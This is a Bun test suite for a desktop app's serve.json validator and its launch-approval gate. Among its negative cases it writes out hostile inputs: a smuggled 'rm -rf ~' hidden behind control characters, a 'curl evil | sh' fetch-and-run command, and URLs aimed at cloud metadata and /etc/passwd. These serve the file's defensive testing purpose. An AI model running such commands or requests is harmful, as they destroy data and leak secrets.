import { afterAll, afterEach, beforeAll, expect, test } from 'bun:test'
import {
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync
} from 'node:fs'
import { tmpdir } from 'node:os'
import { join, relative } from 'node:path'
import { approve, readApprovals } from '../desktop/src/main/launch-approval.ts'
import { initDeckLog } from '../desktop/src/main/log.ts'
import {
  SERVE_APPROVAL_FIELDS,
  SERVE_CONFIG_FIELD_NAMES,
  SERVE_OUTSIDE_APPROVAL_FIELDS,
  isMintedServeAction,
  readServeConfig,
  resolveApprovedServeConfig,
  serveApprovalHash,
  serveApprovalPayload,
  type ServeApprovalPrompt,
  type ServeConfig,
  type ServeConfigReadResult,
  validateServeConfig
} from '../desktop/src/main/serve-config.ts'

const projects: string[] = []
const logsDir = mkdtempSync(join(tmpdir(), 'cp-serve-logs-'))

function createProject(): string {
  const project = realpathSync.native(mkdtempSync(join(tmpdir(), 'cp-serve-config-')))
  mkdirSync(join(project, '.claude', 'claude-peers'), { recursive: true })
  mkdirSync(join(project, 'web'), { recursive: true })
  projects.push(project)
  return project
}

function servePath(project: string): string {
  return join(project, '.claude', 'claude-peers', 'serve.json')
}

function validServeJson(): Record<string, unknown> {
  return {
    version: 1,
    name: 'Web server',
    actions: [
      {
        name: 'web',
        cwd: 'web',
        command: 'bun run dev -- --host ${HOST} --port ${PORT}',
        port: 'auto',
        url: 'http://${HOST}:${PORT}/',
        health: 'http://${HOST}:${PORT}/health',
        readyTimeoutSec: 30,
        env: { BROWSER: 'none', NODE_ENV: 'development' },
        inheritEnv: ['PATH', 'HOME']
      }
    ],
    primary: 'web'
  }
}

function writeServeJson(project: string, value: unknown): void {
  writeFileSync(servePath(project), JSON.stringify(value), 'utf-8')
}

function errorOf(result: ServeConfigReadResult): string {
  if ('error' in result) return result.error
  throw new Error('expected serve config rejection')
}

function actionOf(fixture: Record<string, unknown>): Record<string, unknown> {
  return (fixture.actions as Array<Record<string, unknown>>)[0]!
}

async function validConfig(project: string) {
  writeServeJson(project, validServeJson())
  const result = await readServeConfig(project)
  if ('error' in result) throw new Error(result.error)
  return result.config
}

beforeAll(() => {
  initDeckLog(logsDir)
})

afterEach(() => {
  for (const project of projects.splice(0)) {
    rmSync(project, { recursive: true, force: true })
  }
})

afterAll(() => {
  rmSync(logsDir, { recursive: true, force: true })
})

test('accepts a complete v1 serve.json and resolves the action cwd', async () => {
  const project = createProject()
  const config = await validConfig(project)

  expect(config.version).toBe(1)
  expect(config.actions).toHaveLength(1)
  expect(config.actions[0]!.cwd).toBe(realpathSync.native(join(project, 'web')))
  expect(config.actions[0]!.port).toBe('auto')
})

test('rejects ../x and absolute cwd values', async () => {
  const project = createProject()
  const escapeTarget = join(project, '..', 'outside')
  mkdirSync(escapeTarget)

  try {
    const traversing = validServeJson()
    actionOf(traversing).cwd = '../outside'
    await expect(validateServeConfig(traversing, project)).rejects.toThrow('cwd')

    const absolute = validServeJson()
    actionOf(absolute).cwd = join(project, 'web')
    await expect(validateServeConfig(absolute, project)).rejects.toThrow('cwd')
  } finally {
    rmSync(escapeTarget, { recursive: true, force: true })
  }
})

test('returns missing without logging an error and reports read JSON validation failures', async () => {
  const project = createProject()

  expect(await readServeConfig(project)).toEqual({ error: 'missing' })
  mkdirSync(servePath(project))
  expect(await readServeConfig(project)).toEqual({ error: 'read' })
  rmSync(servePath(project), { recursive: true, force: true })
  writeFileSync(servePath(project), '{broken', 'utf-8')
  expect(errorOf(await readServeConfig(project))).toContain('invalid JSON')
  const invalid = validServeJson()
  invalid.version = '1'
  writeServeJson(project, invalid)
  expect(errorOf(await readServeConfig(project))).toContain('version')

  const log = readFileSync(join(logsDir, 'main.log'), 'utf-8')
  expect(log).not.toContain('[serve-config] serve.json is missing')
  expect(log).toContain('[serve-config] could not read serve.json')
  expect(log).toContain('[serve-config] invalid serve.json')
  expect(log).toContain('[serve-config] rejected serve.json: version: must be 1')
})

test('rejects an invalid type for every declared field', async () => {
  const wrongRootValue: Record<string, unknown> = {
    version: '1',
    name: 1,
    actions: {},
    primary: 1
  }
  const wrongActionValue: Record<string, unknown> = {
    name: 1,
    cwd: 1,
    command: 1,
    port: {},
    url: 1,
    health: 1,
    readyTimeoutSec: '30',
    env: [],
    inheritEnv: {}
  }

  for (const field of SERVE_CONFIG_FIELD_NAMES.root) {
    const project = createProject()
    const fixture = validServeJson()
    fixture[field] = wrongRootValue[field] ?? null
    writeServeJson(project, fixture)
    expect(errorOf(await readServeConfig(project))).toContain(field)
  }

  for (const field of SERVE_CONFIG_FIELD_NAMES.action) {
    const project = createProject()
    const fixture = validServeJson()
    const actions = fixture.actions as Array<Record<string, unknown>>
    actions[0]![field] = wrongActionValue[field] ?? null
    writeServeJson(project, fixture)
    expect(errorOf(await readServeConfig(project))).toContain(field)
  }
})

test('rejects constrained values that retain their structural types', async () => {
  const invalidCases: Array<{
    field: string
    mutate: (fixture: Record<string, unknown>) => void
  }> = [
    { field: 'port', mutate: (fixture) => { actionOf(fixture).port = 1023 } },
    { field: 'port', mutate: (fixture) => { actionOf(fixture).port = 65_536 } },
    { field: 'port', mutate: (fixture) => { actionOf(fixture).port = 8_080.5 } },
    { field: 'readyTimeoutSec', mutate: (fixture) => { actionOf(fixture).readyTimeoutSec = 0 } },
    { field: 'readyTimeoutSec', mutate: (fixture) => { actionOf(fixture).readyTimeoutSec = 601 } },
    { field: 'readyTimeoutSec', mutate: (fixture) => { actionOf(fixture).readyTimeoutSec = 1.5 } },
    { field: 'env', mutate: (fixture) => { actionOf(fixture).env = { lower: 'value' } } },
    { field: 'env', mutate: (fixture) => { actionOf(fixture).env = { PORT: '5000' } } },
    { field: 'env', mutate: (fixture) => { actionOf(fixture).env = { HOST: '127.0.0.1' } } },
    { field: 'env', mutate: (fixture) => { actionOf(fixture).env = { NAME: 1 } } },
    { field: 'inheritEnv', mutate: (fixture) => { actionOf(fixture).inheritEnv = ['lower'] } },
    { field: 'inheritEnv', mutate: (fixture) => { actionOf(fixture).inheritEnv = ['PORT'] } },
    { field: 'inheritEnv', mutate: (fixture) => { actionOf(fixture).inheritEnv = ['HOST'] } },
    { field: 'primary', mutate: (fixture) => { fixture.primary = 'api' } }
  ]

  for (const invalidCase of invalidCases) {
    const project = createProject()
    const fixture = validServeJson()
    invalidCase.mutate(fixture)
    writeServeJson(project, fixture)
    expect(errorOf(await readServeConfig(project))).toContain(invalidCase.field)
  }
})

test('rejects a control or format character hidden in the command or an env value', async () => {
  const hidden = [0x0a, 0x0d, 0x1b, 0x09, 0x200b, 0x202e, 0x2028, 0x2029].map((code) => String.fromCharCode(code))
  for (const char of hidden) {
    const inCommand = validServeJson()
    actionOf(inCommand).command = `bun run dev${char}rm -rf ~`
    await expect(validateServeConfig(inCommand, createProject()), `U+${char.charCodeAt(0).toString(16)} in command`).rejects.toThrow(
      'command: the command contains a control, format or non-ASCII space character'
    )

    const inEnv = validServeJson()
    actionOf(inEnv).env = { MODE: `dev${char}x` }
    await expect(validateServeConfig(inEnv, createProject()), `U+${char.charCodeAt(0).toString(16)} in env`).rejects.toThrow(
      'env: value for MODE contains a control, format or non-ASCII space character'
    )
  }
})

test('holds url and health to the loopback host and port of the server the action starts', async () => {
  const rejected: Array<{ field: 'url' | 'health'; value: string; port?: number }> = [
    { field: 'url', value: 'http://192.168.1.10:${PORT}/' },
    { field: 'health', value: 'http://169.254.169.254:${PORT}/latest/meta-data' },
    { field: 'health', value: 'http://localhost.evil.test:${PORT}/' },
    { field: 'health', value: 'http://[::1]:${PORT}/' },
    { field: 'health', value: 'http://user@127.0.0.1:${PORT}/' },
    { field: 'health', value: 'http://127.0.0.1:${PORT}@evil.test/' },
    { field: 'health', value: 'http://127.0.0.1/health' },
    { field: 'health', value: 'http://127.0.0.1:22/' },
    { field: 'health', value: 'http://127.0.0.1:5000/', port: 4000 },
    { field: 'url', value: 'file:///etc/passwd' },
    { field: 'url', value: 'ftp://${HOST}:${PORT}/' }
  ]
  for (const { field, value, port } of rejected) {
    const fixture = validServeJson()
    actionOf(fixture)[field] = value
    if (port !== undefined) actionOf(fixture).port = port
    await expect(validateServeConfig(fixture, createProject()), `${field} = ${value}`).rejects.toThrow(`${field}: must be an http(s) URL on`)
  }

  const accepted: Array<{ url: string; health: string; port?: number }> = [
    { url: 'http://${HOST}:${PORT}/', health: 'https://localhost:${PORT}/ready?x=1#y' },
    { url: 'http://127.0.0.1:4000/', health: 'http://${HOST}:${PORT}/health', port: 4000 }
  ]
  for (const { url, health, port } of accepted) {
    const fixture = validServeJson()
    Object.assign(actionOf(fixture), { url, health }, port === undefined ? {} : { port })
    expect((await validateServeConfig(fixture, createProject())).actions[0]).toMatchObject({ url, health })
  }
})

test('rejects a non-ASCII space that would pad the command, cwd or an env value out of sight', async () => {
  for (const code of [0x00a0, 0x2003, 0x3000]) {
    const space = String.fromCharCode(code)
    const cases: Array<[string, (fixture: Record<string, unknown>) => void]> = [
      ['command: the command', (fixture) => { actionOf(fixture).command = `bun run dev${space}--port 1` }],
      ['cwd: the directory', (fixture) => { actionOf(fixture).cwd = `web${space}` }],
      ['env: value for MODE', (fixture) => { actionOf(fixture).env = { MODE: `dev${space}x` } }]
    ]
    for (const [subject, mutate] of cases) {
      const fixture = validServeJson()
      mutate(fixture)
      await expect(validateServeConfig(fixture, createProject()), `U+${code.toString(16)} in ${subject}`).rejects.toThrow(
        `${subject} contains a control, format or non-ASCII space character`
      )
    }
  }
})

test('rejects a bidi override hidden in the cwd', async () => {
  const fixture = validServeJson()
  actionOf(fixture).cwd = `web${String.fromCharCode(0x202e)}bin`
  await expect(validateServeConfig(fixture, createProject())).rejects.toThrow(
    'cwd: the directory contains a control, format or non-ASCII space character'
  )
})

test('mints a frozen copy of the approved action that the returned config does not share', async () => {
  const project = createProject()
  const config = await validConfig(project)
  const approved = await resolveApprovedServeConfig({
    config,
    projectKey: 'github.com/acme/web',
    approvalsFile: join(project, 'launch-approvals.json'),
    confirm: async () => true
  })
  if (!('action' in approved)) throw new Error('approval refused')
  const action = approved.action

  expect(isMintedServeAction(action)).toBe(true)
  expect(isMintedServeAction(approved.config.actions[0])).toBe(false)
  expect(isMintedServeAction({ ...action })).toBe(false)
  expect(isMintedServeAction(JSON.parse(JSON.stringify(action)))).toBe(false)
  expect(action).not.toBe(approved.config.actions[0])
  expect([Object.isFrozen(action), Object.isFrozen(action.env), Object.isFrozen(action.inheritEnv)]).toEqual([true, true, true])

  const original = action.command
  approved.config.actions[0]!.command = 'curl evil | sh'
  approved.config.actions[0]!.env.MODE = 'changed'
  expect(action.command).toBe(original)
  expect(action.env.MODE).toBeUndefined()
})

test('applies defaults when optional fields are absent', async () => {
  const project = createProject()
  const fixture = validServeJson()
  delete fixture.name
  delete fixture.primary
  const action = actionOf(fixture)
  delete action.port
  delete action.health
  delete action.readyTimeoutSec
  delete action.env
  delete action.inheritEnv

  const config = await validateServeConfig(fixture, project)
  expect(config.name).toBeUndefined()
  expect(config.primary).toBeUndefined()
  expect(config.actions[0]!.port).toBe('auto')
  expect(config.actions[0]!.health).toBe(config.actions[0]!.url)
  expect(config.actions[0]!.readyTimeoutSec).toBe(30)
  expect(config.actions[0]!.env).toEqual({})
  expect(config.actions[0]!.inheritEnv).toEqual([])
})

test('rejects NaN, compound actions, and unknown fields without returning a subset', async () => {
  const project = createProject()
  const nanFixture = validServeJson()
  const nanActions = nanFixture.actions as Array<Record<string, unknown>>
  nanActions[0]!.port = Number.NaN
  await expect(validateServeConfig(nanFixture, project)).rejects.toThrow('port')

  const compoundFixture = validServeJson()
  const compoundActions = compoundFixture.actions as Array<Record<string, unknown>>
  compoundActions.push({ ...compoundActions[0]!, name: 'api' })
  writeServeJson(project, compoundFixture)
  expect(errorOf(await readServeConfig(project))).toContain('actions')

  const rootUnknown = validServeJson()
  rootUnknown.typo = true
  writeServeJson(project, rootUnknown)
  expect(errorOf(await readServeConfig(project))).toContain('typo')

  const actionUnknown = validServeJson()
  const actionUnknownActions = actionUnknown.actions as Array<Record<string, unknown>>
  actionUnknownActions[0]!.typo = true
  writeServeJson(project, actionUnknown)
  expect(errorOf(await readServeConfig(project))).toContain('typo')
})

test('derives approval fields from the closed outside-approval set', () => {
  expect(SERVE_OUTSIDE_APPROVAL_FIELDS).toEqual(['name', 'url', 'health', 'readyTimeoutSec'])
  expect(SERVE_APPROVAL_FIELDS).toEqual(
    SERVE_CONFIG_FIELD_NAMES.action.filter((field) => !SERVE_OUTSIDE_APPROVAL_FIELDS.includes(field))
  )
})

test('keeps execution-neutral fields outside approval', async () => {
  const project = createProject()
  const config = await validConfig(project)
  const action = config.actions[0]!
  const reordered: ServeConfig = {
    ...config,
    actions: [{ ...action, env: { NODE_ENV: 'development', BROWSER: 'none' } }]
  }
  const changedName: ServeConfig = {
    ...config,
    primary: 'preview',
    actions: [{ ...action, name: 'preview' }]
  }
  const changedUrl: ServeConfig = {
    ...config,
    actions: [{ ...action, url: 'http://${HOST}:${PORT}/preview' }]
  }
  const changedHealth: ServeConfig = {
    ...config,
    actions: [{ ...action, health: 'http://${HOST}:${PORT}/ready' }]
  }
  const changedTimeout: ServeConfig = {
    ...config,
    actions: [{ ...action, readyTimeoutSec: 45 }]
  }
  const changedEnv: ServeConfig = {
    ...config,
    actions: [{ ...action, env: { ...action.env, MODE: 'preview' } }]
  }

  expect(serveApprovalHash(reordered)).toBe(serveApprovalHash(config))
  expect(serveApprovalHash(changedName)).toBe(serveApprovalHash(config))
  expect(serveApprovalHash(changedUrl)).toBe(serveApprovalHash(config))
  expect(serveApprovalHash(changedHealth)).toBe(serveApprovalHash(config))
  expect(serveApprovalHash(changedTimeout)).toBe(serveApprovalHash(config))
  expect(serveApprovalHash(changedEnv)).not.toBe(serveApprovalHash(config))
})

test('requires one explicit approval before exposing a repository serve config', async () => {
  const project = createProject()
  const config = await validConfig(project)
  const action = config.actions[0]!
  const approvalsFile = join(project, 'launch-approvals.json')
  let prompt: ServeApprovalPrompt | undefined

  const refused = await resolveApprovedServeConfig({
    config,
    projectKey: 'github.com/acme/web',
    approvalsFile,
    confirm: async (details) => {
      prompt = details
      return false
    }
  })
  expect(refused).toEqual({ error: 'refused', prompted: true })
  expect(prompt).toEqual({
    command: action.command,
    cwd: action.cwd,
    env: action.env,
    inheritEnv: action.inheritEnv,
    port: action.port
  })
  expect(Object.keys(prompt!).sort(), 'the prompt shows exactly the fields the approval hash covers').toEqual(
    [...SERVE_APPROVAL_FIELDS].sort()
  )

  const approved = await resolveApprovedServeConfig({
    config,
    projectKey: 'github.com/acme/web',
    approvalsFile,
    confirm: async () => true
  })
  expect(approved).toMatchObject({ action, prompted: true })

  const changedTimeout: ServeConfig = {
    ...config,
    actions: [{ ...action, readyTimeoutSec: 45 }]
  }
  const retainedApproval = await resolveApprovedServeConfig({
    config: changedTimeout,
    projectKey: 'github.com/acme/web',
    approvalsFile,
    confirm: async () => {
      throw new Error('ready timeout must not require a new approval')
    }
  })
  expect('config' in retainedApproval).toBe(true)
  expect(retainedApproval.prompted).toBe(false)
})

test('honours an approval stored under the launch-command key without prompting again', async () => {
  const project = createProject()
  const config = await validConfig(project)
  const approvalsFile = join(project, 'launch-approvals.json')
  approve(approvalsFile, 'github.com/acme/web::serve', serveApprovalPayload(config))

  const result = await resolveApprovedServeConfig({
    config,
    projectKey: 'github.com/acme/web',
    approvalsFile,
    confirm: async () => {
      throw new Error('a stored approval must not prompt')
    }
  })

  expect(result).toMatchObject({ prompted: false })
  expect('action' in result).toBe(true)
})

test('persists nothing when the operator refuses or the dialog fails', async () => {
  const project = createProject()
  const config = await validConfig(project)
  const approvalsFile = join(project, 'launch-approvals.json')

  for (const confirm of [async () => false, async () => Promise.reject(new Error('dialog gone'))]) {
    expect(await resolveApprovedServeConfig({ config, projectKey: 'github.com/acme/web', approvalsFile, confirm })).toEqual({
      error: 'refused',
      prompted: true
    })
  }
  expect(readApprovals(approvalsFile)).toEqual({})

  await resolveApprovedServeConfig({ config, projectKey: 'github.com/acme/web', approvalsFile, confirm: async () => true })
  expect(readApprovals(approvalsFile)).toEqual({ 'github.com/acme/web::serve': serveApprovalHash(config) })
})

test('writes launch-approvals.json only from the three native-dialog gates', () => {
  const root = join(import.meta.dir, '..', 'desktop', 'src')
  const sites: string[] = []
  const walk = (dir: string): void => {
    for (const entry of readdirSync(dir, { withFileTypes: true })) {
      const path = join(dir, entry.name)
      if (entry.isDirectory()) walk(path)
      else if (/\.tsx?$/.test(entry.name)) {
        readFileSync(path, 'utf8')
          .split(/\r?\n/)
          .forEach((line) => {
            const code = line.trim()
            if (code.startsWith('*') || code.startsWith('//') || code.startsWith('/*') || code.startsWith('export function approve(')) return
            if (/\bapprove\(/.test(code)) sites.push(relative(root, path).replace(/\\/g, '/'))
          })
      }
    }
  }
  walk(root)

  expect(sites.sort(), 'approve( call sites: launch-command gate, shell-field gate, serve.json gate').toEqual([
    'main/index.ts',
    'main/launch-approval.ts',
    'main/serve-config.ts'
  ])
})

test('refuses a serve.json reached through a link that leaves the project', async () => {
  const outer = realpathSync.native(mkdtempSync(join(tmpdir(), 'cp-serve-escape-')))
  try {
    const project = join(outer, 'project')
    const elsewhere = join(outer, 'elsewhere')
    mkdirSync(join(project, '.claude'), { recursive: true })
    mkdirSync(join(project, 'web'), { recursive: true })
    mkdirSync(elsewhere, { recursive: true })
    writeFileSync(join(elsewhere, 'serve.json'), JSON.stringify(validServeJson()), 'utf-8')
    symlinkSync(elsewhere, join(project, '.claude', 'claude-peers'), 'junction')

    expect(await readServeConfig(project)).toEqual({ error: 'read' })
  } finally {
    rmSync(outer, { recursive: true, force: true })
  }
})

test('reports the real, contained path of the serve.json it read', async () => {
  const project = createProject()
  writeServeJson(project, validServeJson())

  const result = await readServeConfig(project)

  expect('path' in result && result.path).toBe(realpathSync.native(servePath(project)))
})

test('canonicalizes a symlinked project prefix before accepting cwd', async () => {
  const outer = realpathSync.native(mkdtempSync(join(tmpdir(), 'cp-serve-link-')))
  const realProject = join(outer, 'project')
  const linkedProject = join(outer, 'via-link')
  mkdirSync(join(realProject, '.claude', 'claude-peers'), { recursive: true })
  mkdirSync(join(realProject, 'web'), { recursive: true })
  symlinkSync(realProject, linkedProject, 'junction')

  try {
    writeServeJson(linkedProject, validServeJson())
    const config = await validConfig(linkedProject)
    expect(config.actions[0]!.cwd).toBe(realpathSync.native(join(realProject, 'web')))
  } finally {
    rmSync(outer, { recursive: true, force: true })
  }
})
